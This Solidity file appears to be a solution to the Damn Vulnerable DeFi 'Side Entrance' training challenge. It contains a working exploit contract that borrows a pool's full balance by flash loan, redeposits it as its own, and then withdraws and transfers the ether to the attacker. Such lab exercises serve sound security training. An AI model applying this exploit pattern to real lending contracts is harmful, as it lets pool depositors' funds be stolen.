// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './SideEntranceLenderPool.sol';


/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolHack is IFlashLoanEtherReceiver {

  function hack(SideEntranceLenderPool pool) external {
    pool.flashLoan(address(pool).balance);
    pool.withdraw();
    payable(msg.sender).transfer(address(this).balance);
  }

  function execute() external payable {
    SideEntranceLenderPool pool = SideEntranceLenderPool(msg.sender);
    pool.deposit{value: address(this).balance}();
  }

  receive() external payable {}
}
